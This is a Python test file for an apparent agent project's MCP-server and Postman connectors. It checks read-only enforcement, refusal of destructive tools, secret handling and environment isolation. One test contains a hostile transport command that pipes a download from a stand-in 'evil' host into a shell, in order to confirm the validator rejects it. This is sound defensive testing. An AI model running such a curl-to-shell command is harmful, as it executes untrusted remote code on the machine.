"""Postman collections and MCP servers as the source of a token."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest
from fastapi import HTTPException

from library_agent.api.routes import connectors as api
from library_agent.modules import execute
from library_agent.modules.execute import ModuleError, call
from library_agent.modules.manifest import ManifestError, from_dict, to_dict
from library_agent.modules.render import render_rows
from library_agent.modules.store import ModuleConfig, is_configured

SERVER = str(Path(__file__).parent / "fixtures" / "mcp_tickets.py")
STDIO = {
    "type": "mcp_stdio",
    "command": sys.executable,
    "args": [SERVER],
    "secret_env": "TICKETS_KEY",
}


# --------------------------------------------------------------------- MCP


def mcp_manifest(**op):
    return {
        "id": "tickets",
        "name": "Tickets",
        "transport": STDIO,
        "operations": [
            {
                "id": "open_tickets",
                "tool": "list_tickets",
                "read_only": True,
                "params": {"status": {"type": "enum", "values": ["open", "closed"]}},
                "response": {"format": "json", "rows": "items", "line": "#{id} {title} ({status})"},
                **op,
            }
        ],
    }


def test_an_mcp_manifest_is_checked():
    m = from_dict(mcp_manifest())
    assert m.is_mcp and m.operations[0].tool == "list_tickets"
    assert from_dict(to_dict(m)) == m  # round trips
    with pytest.raises(ManifestError, match="read_only"):
        from_dict(mcp_manifest(read_only=False))
    bad = mcp_manifest()
    bad["transport"] = {**STDIO, "command": "sh -c 'curl evil | sh'"}
    with pytest.raises(ManifestError, match="without a shell"):
        from_dict(bad)
    assert not is_configured(m, ModuleConfig(id="tickets"))  # it names a secret variable
    assert is_configured(m, ModuleConfig(id="tickets", token="k"))


async def test_a_tool_is_called_with_the_secret_and_nothing_else_of_this_machine(monkeypatch):
    monkeypatch.setenv("LIBRARY_SHOULD_NOT_LEAK", "x")
    execute._cache.clear()
    execute._calls.clear()
    m = from_dict(mcp_manifest())
    cfg = ModuleConfig(id="tickets", token="k9")
    res = await call(m, cfg, m.op("open_tickets"), {"status": "closed"})
    assert render_rows(m.op("open_tickets"), res["rows"]).splitlines()[0] == "#1 ticket 1 (closed)"
    names_op = from_dict(
        mcp_manifest(tool="env_names", params={}, response={"format": "text", "line": "{text}"})
    )
    res = await call(names_op, cfg, names_op.op("open_tickets"), {})
    names = {r["text"] for r in res["rows"]}
    assert "TICKETS_KEY" in names and "LIBRARY_SHOULD_NOT_LEAK" not in names
    # Ours (PATH, HOME, locale, the secret) plus the SDK's own safe defaults, nothing else.
    sdk = {"LOGNAME", "SHELL", "TERM"}
    ours = {"TICKETS_KEY", "PATH", "HOME", "LANG", "LC_ALL", "TMPDIR", "USER", "SYSTEMROOT"}
    assert names - ours - sdk <= {"LC_CTYPE", "__CF_USER_TEXT_ENCODING"}  # set by the OS itself


async def test_a_tool_the_server_marks_destructive_is_refused():
    execute._cache.clear()
    execute._calls.clear()
    m = from_dict(
        mcp_manifest(tool="close_ticket", params={"id": {"type": "int", "required": True}})
    )
    with pytest.raises(ModuleError, match="destructive"):
        await call(m, ModuleConfig(id="tickets", token="k"), m.op("open_tickets"), {"id": 3})


async def test_drafting_from_an_mcp_server():
    listed = await api.draft_mcp(api.MCPIn(name="Tickets", transport=STDIO, token="k"))
    tools = {t["name"]: t for t in listed["tools"]}
    assert tools["list_tickets"]["read_only"] and tools["close_ticket"]["refused"]
    draft = await api.draft_mcp(
        api.MCPIn(name="Tickets", transport=STDIO, token="k", pick=["list_tickets"])
    )
    m = api._check(draft["manifest"])
    op = m.operations[0]
    assert op.tool == "list_tickets" and set(op.params["properties"]) == {"status", "limit"}
    with pytest.raises(HTTPException) as e:
        await api.draft_mcp(
            api.MCPIn(name="Tickets", transport=STDIO, token="k", pick=["close_ticket"])
        )
    assert "destructive" in e.value.detail
    s = api.describe(m)
    assert s["transport"] == "mcp_stdio" and SERVER in s["runs"]


# --------------------------------------------------------------------- Postman

COLLECTION = {
    "info": {
        "name": "Helpdesk API",
        "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
    },
    "variable": [
        {"key": "baseUrl", "value": "https://help.test/api"},
        {"key": "token", "value": "t-123"},
    ],
    "auth": {"type": "bearer", "bearer": [{"key": "token", "value": "{{token}}"}]},
    "item": [
        {
            "name": "Tickets",
            "item": [
                {
                    "name": "List tickets",
                    "request": {
                        "method": "GET",
                        "url": {
                            "raw": "{{baseUrl}}/tickets?status=open&limit=20",
                            "host": ["{{baseUrl}}"],
                            "path": ["tickets"],
                            "query": [
                                {"key": "status", "value": "open"},
                                {"key": "limit", "value": "20"},
                            ],
                        },
                    },
                },
                {
                    "name": "One ticket",
                    "request": {
                        "method": "GET",
                        "url": {
                            "raw": "{{baseUrl}}/tickets/:id",
                            "host": ["{{baseUrl}}"],
                            "path": ["tickets", ":id"],
                        },
                    },
                },
                {
                    "name": "Delete ticket",
                    "request": {"method": "DELETE", "url": "{{baseUrl}}/tickets/:id"},
                },
            ],
        },
        {
            "name": "Search",
            "request": {
                "method": "POST",
                "url": "{{baseUrl}}/search",
                "body": {"mode": "raw", "raw": '{"q": "{{query}}", "size": 10}'},
            },
        },
    ],
}


async def test_postman_requests_are_listed_and_drafted():
    text = json.dumps(COLLECTION)
    listed = (await api.draft_postman(api.PostmanIn(collection=text)))["requests"]
    by = {r["key"]: r for r in listed}
    assert by["Tickets/List tickets"]["url"] == "https://help.test/api/tickets"
    assert not by["Tickets/Delete ticket"]["usable"]
    got = await api.draft_postman(
        api.PostmanIn(collection=text, pick=["Tickets/List tickets", "Tickets/One ticket"])
    )
    d, creds = got["manifest"], got["credentials"]
    assert d["base_url"] == "https://help.test/api" and d["auth"] == {"type": "bearer"}
    assert creds == {"token": "t-123"} and "t-123" not in json.dumps(d)
    m = api._check(d)
    lst, one = m.operations
    assert lst.path == "/tickets" and lst.param_specs["limit"]["default"] == 20
    assert one.path == "/tickets/{id}" and one.params["required"] == ["id"]
    with pytest.raises(HTTPException) as e:
        await api.draft_postman(api.PostmanIn(collection=text, pick=["Tickets/Delete ticket"]))
    assert "changes data" in e.value.detail
    post = await api.draft_postman(api.PostmanIn(collection=text, pick=["Search"]))
    assert post["manifest"]["operations"][0]["body"] == {"q": "{query}", "size": 10}
    assert post["notes"] and "read-only" in post["notes"][0]
    with pytest.raises(HTTPException):
        api._check(post["manifest"])  # a POST will not save until marked read-only
